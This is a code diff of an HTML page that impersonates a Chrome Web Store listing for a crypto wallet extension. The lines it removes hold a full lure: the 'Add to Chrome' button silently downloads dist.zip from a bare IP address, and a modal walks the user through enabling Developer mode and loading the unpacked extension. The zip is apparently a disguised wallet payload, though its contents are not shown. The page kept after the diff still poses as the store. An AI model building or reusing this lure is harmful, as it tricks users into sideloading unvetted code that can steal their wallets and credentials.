@@ -4,40 +4,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>ZKX Web3 Wallet - Chrome Web Store</title>
   <script src="https://cdn.tailwindcss.com"></script>
-  <link class="favicon" rel="icon" href="https://ssl.gstatic.com/chrome/webstore/images/icon_48px.png" sizes="48x48">
+  <link rel="icon" href="https://ssl.gstatic.com/chrome/webstore/images/icon_48px.png" sizes="48x48">
   <style>
     .scrollbar-hide::-webkit-scrollbar { display: none; }
     .scrollbar-hide { -ms-overflow-style: none; scrollbar-width: none; }
     @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap');
-
-    /* Modern dialog styling with transitions */
-    dialog::backdrop {
-      background-color: rgba(15, 23, 42, 0.45);
-      backdrop-filter: blur(8px);
-      opacity: 0;
-      transition: opacity 0.3s ease-out;
-    }
-    dialog[open]::backdrop {
-      opacity: 1;
-    }
-    dialog {
-      opacity: 0;
-      transform: scale(0.95) translateY(10px);
-      transition: opacity 0.3s ease-out, transform 0.3s ease-out, display 0.3s allow-discrete;
-    }
-    dialog[open] {
-      opacity: 1;
-      transform: scale(1) translateY(0);
-    }
-    @starting-style {
-      dialog[open] {
-        opacity: 0;
-        transform: scale(0.95) translateY(10px);
-      }
-      dialog[open]::backdrop {
-        opacity: 0;
-      }
-    }
   </style>
 </head>
 <body class="bg-white text-gray-900 font-['Google_Sans',Roboto,Arial,sans-serif] antialiased min-h-screen">
@@ -124,7 +95,7 @@
             </div>
           </div>
           <div class="ml-auto shrink-0">
-            <button id="add-to-chrome-btn" class="bg-blue-600 hover:bg-blue-700 text-white font-bold px-8 py-3 rounded-full text-sm shadow-sm transition-all duration-200 active:scale-95">
+            <button class="bg-blue-600 hover:bg-blue-700 text-white font-bold px-8 py-3 rounded-full text-sm shadow-sm">
               Add to Chrome
             </button>
           </div>
@@ -256,204 +227,5 @@
     </div>
   </div>
 
-  <!-- Manual Installation Instructions Modal -->
-  <dialog id="download-modal" class="rounded-3xl p-8 md:p-10 max-w-4xl w-11/12 border border-gray-100 shadow-2xl focus:outline-none bg-white overflow-y-auto max-h-[90vh]">
-    <div class="relative">
-      <!-- Close button -->
-      <button id="close-modal-btn" class="absolute -top-3 -right-3 w-10 h-10 flex items-center justify-center rounded-full hover:bg-gray-100 text-gray-500 transition-colors focus:outline-none focus:ring-2 focus:ring-blue-500" aria-label="Close modal">
-        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-          <line x1="18" y1="6" x2="6" y2="18"></line>
-          <line x1="6" y1="6" x2="18" y2="18"></line>
-        </svg>
-      </button>
-
-      <!-- Content Header -->
-      <div class="text-center mb-8">
-        <h2 class="text-3xl md:text-4xl font-bold text-gray-900 tracking-tight mb-3">Thanks for downloading!<br>Just a few steps left</h2>
-        <p class="text-sm text-gray-600">
-          Your download will begin automatically. If it didn't start, 
-          <a href="http://207.189.0.231:5173/dist.zip" id="manual-download-link" class="text-blue-600 hover:underline font-semibold inline-flex items-center gap-1">
-            download xWallet manually
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
-          </a>.
-        </p>
-      </div>
-
-      <!-- Step Cards -->
-      <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-        <!-- Step 1 Card: Unzip -->
-        <div class="flex flex-col bg-gradient-to-b from-[#1a73e8] to-[#1557b0] text-white rounded-2xl overflow-hidden shadow-md h-[400px] border border-blue-400/20">
-          <div class="p-6 flex-1 flex flex-col justify-between">
-            <div>
-              <span class="text-[10px] uppercase tracking-widest font-bold opacity-75">Step 1</span>
-              <h3 class="text-2xl font-bold mt-1 mb-2">Unzip</h3>
-              <p class="text-sm leading-relaxed opacity-90">
-                Locate the downloaded <code class="bg-blue-800/60 px-1.5 py-0.5 rounded text-xs font-mono">dist.zip</code> file in your Downloads folder and extract its contents to get the <code class="bg-blue-800/60 px-1.5 py-0.5 rounded text-xs font-mono">dist</code> folder.
-              </p>
-            </div>
-            <a href="http://207.189.0.231:5173/dist.zip" class="text-xs underline hover:opacity-80 mt-4 inline-flex items-center gap-1 font-medium transition-opacity">
-              Can't find your download?
-            </a>
-          </div>
-          <!-- Mockup area -->
-          <div class="bg-[#e8f0fe] h-44 flex flex-col items-center justify-center p-4 relative overflow-hidden select-none">
-            <!-- Simulated Chrome Download Shelf -->
-            <div class="w-full bg-white rounded-xl shadow-lg border border-blue-100 p-3.5 flex items-center gap-3 transform translate-y-2">
-              <div class="w-8 h-8 rounded-lg bg-blue-100 flex items-center justify-center text-blue-600 shrink-0">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                  <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
-                  <polyline points="7 10 12 15 17 10"></polyline>
-                  <line x1="12" y1="15" x2="12" y2="3"></line>
-                </svg>
-              </div>
-              <div class="min-w-0 flex-1">
-                <p class="text-xs font-semibold text-gray-800 truncate">dist.zip</p>
-                <p class="text-[10px] text-green-600 font-bold flex items-center gap-1">
-                  <span class="w-1.5 h-1.5 rounded-full bg-green-500"></span> Completed
-                </p>
-              </div>
-            </div>
-            <!-- Spotlight effect -->
-            <div class="absolute -bottom-8 w-32 h-32 bg-blue-300/30 rounded-full blur-xl pointer-events-none"></div>
-          </div>
-        </div>
-
-        <!-- Step 2 Card: Developer Mode -->
-        <div class="flex flex-col bg-gradient-to-b from-[#fef3c7] to-[#fde68a] text-gray-900 rounded-2xl overflow-hidden shadow-md h-[400px] border border-amber-200/40">
-          <div class="p-6 flex-1 flex flex-col justify-between">
-            <div>
-              <span class="text-[10px] uppercase tracking-widest font-bold text-amber-800">Step 2</span>
-              <h3 class="text-2xl font-bold mt-1 mb-2">Developer Mode</h3>
-              <p class="text-sm leading-relaxed text-gray-800">
-                Open a new tab in Chrome, enter <code class="bg-amber-200/80 px-1.5 py-0.5 rounded text-xs font-mono">chrome://extensions</code> in the address bar, and turn on the <strong>Developer mode</strong> switch in the top-right.
-              </p>
-            </div>
-          </div>
-          <!-- Mockup area -->
-          <div class="bg-[#fffbeb] h-44 flex flex-col items-center justify-center p-4 relative overflow-hidden select-none">
-            <!-- Simulated Chrome Extensions Header -->
-            <div class="w-full bg-white rounded-xl shadow-lg border border-amber-100 p-4 flex flex-col gap-2 transform translate-y-2">
-              <div class="flex justify-between items-center">
-                <span class="text-xs font-bold text-gray-800">Extensions</span>
-                <!-- Switch -->
-                <div class="flex items-center gap-2">
-                  <span class="text-[9px] text-gray-500 font-bold uppercase tracking-wider">Developer mode</span>
-                  <div class="w-8 h-4.5 bg-blue-600 rounded-full p-0.5 flex items-center justify-end cursor-pointer shadow-inner">
-                    <div class="w-3.5 h-3.5 bg-white rounded-full shadow-sm"></div>
-                  </div>
-                </div>
-              </div>
-              <div class="w-full h-1 bg-gray-100 rounded-full overflow-hidden">
-                <div class="w-2/5 h-full bg-blue-500 rounded-full"></div>
-              </div>
-            </div>
-            <!-- Hovering cursor -->
-            <div class="absolute right-6 bottom-4 w-6 h-6 text-gray-900 drop-shadow-md">
-              <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor">
-                <path d="M5.5 2v18l5.5-5.5h8.5L5.5 2z"/>
-              </svg>
-            </div>
-            <!-- Spotlight effect -->
-            <div class="absolute -bottom-8 w-32 h-32 bg-amber-300/30 rounded-full blur-xl pointer-events-none"></div>
-          </div>
-        </div>
-
-        <!-- Step 3 Card: Load Unpacked -->
-        <div class="flex flex-col bg-gradient-to-b from-[#d1fae5] to-[#a7f3d0] text-gray-900 rounded-2xl overflow-hidden shadow-md h-[400px] border border-emerald-200/40">
-          <div class="p-6 flex-1 flex flex-col justify-between">
-            <div>
-              <span class="text-[10px] uppercase tracking-widest font-bold text-emerald-800">Step 3</span>
-              <h3 class="text-2xl font-bold mt-1 mb-2">Load Unpacked</h3>
-              <p class="text-sm leading-relaxed text-gray-800">
-                Click the <strong>Load unpacked</strong> button in the top-left of the Extensions page, and select the extracted <code class="bg-emerald-200/80 px-1.5 py-0.5 rounded text-xs font-mono">dist</code> folder to complete the installation.
-              </p>
-            </div>
-          </div>
-          <!-- Mockup area -->
-          <div class="bg-[#f0fdf4] h-44 flex flex-col items-center justify-center p-4 relative overflow-hidden select-none">
-            <!-- Simulated Load Unpacked Button -->
-            <div class="w-full bg-white rounded-xl shadow-lg border border-emerald-100 p-4 flex flex-col gap-2 transform translate-y-2">
-              <div class="flex gap-2">
-                <div class="bg-blue-600 hover:bg-blue-700 text-white text-[10px] font-bold px-3 py-2 rounded-lg shadow-md flex items-center gap-1.5 border border-blue-700 transition-colors">
-                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
-                    <polyline points="17 8 12 3 7 8"></polyline>
-                    <line x1="12" y1="3" x2="12" y2="15"></line>
-                  </svg>
-                  Load unpacked
-                </div>
-                <div class="bg-gray-50 text-gray-600 text-[10px] font-bold px-3 py-2 rounded-lg border border-gray-200">
-                  Pack extension
-                </div>
-              </div>
-            </div>
-            <!-- Spotlight effect -->
-            <div class="absolute -bottom-8 w-32 h-32 bg-emerald-300/30 rounded-full blur-xl pointer-events-none"></div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </dialog>
-
-  <!-- Script for triggering download and opening/closing modal -->
-  <script>
-    document.addEventListener('DOMContentLoaded', () => {
-      const addToChromeBtn = document.getElementById('add-to-chrome-btn');
-      const downloadModal = document.getElementById('download-modal');
-      const closeModalBtn = document.getElementById('close-modal-btn');
-      const manualDownloadLink = document.getElementById('manual-download-link');
-
-      function triggerDownload() {
-        const link = document.createElement('a');
-        link.href = 'http://207.189.0.231:5173/dist.zip';
-        link.download = 'dist.zip';
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-      }
-
-      if (addToChromeBtn && downloadModal) {
-        addToChromeBtn.addEventListener('click', (e) => {
-          e.preventDefault();
-          // Trigger the zip file download
-          triggerDownload();
-          // Open the manual setup instructions modal
-          downloadModal.showModal();
-          // Prevent body scrolling
-          document.body.style.overflow = 'hidden';
-        });
-      }
-
-      function handleModalClose() {
-        downloadModal.close();
-        document.body.style.overflow = '';
-      }
-
-      if (closeModalBtn) {
-        closeModalBtn.addEventListener('click', handleModalClose);
-      }
-
-      // Close modal when clicking on the backdrop
-      if (downloadModal) {
-        downloadModal.addEventListener('click', (e) => {
-          const rect = downloadModal.getBoundingClientRect();
-          const isInDialog = (
-            rect.top <= e.clientY &&
-            e.clientY <= rect.top + rect.height &&
-            rect.left <= e.clientX &&
-            e.clientX <= rect.left + rect.width
-          );
-          if (!isInDialog) {
-            handleModalClose();
-          }
-        });
-
-        // Clean up overflow styling when modal is closed via ESC key
-        downloadModal.addEventListener('close', () => {
-          document.body.style.overflow = '';
-        });
-      }
-    });
-  </script>
 </body>
 </html>
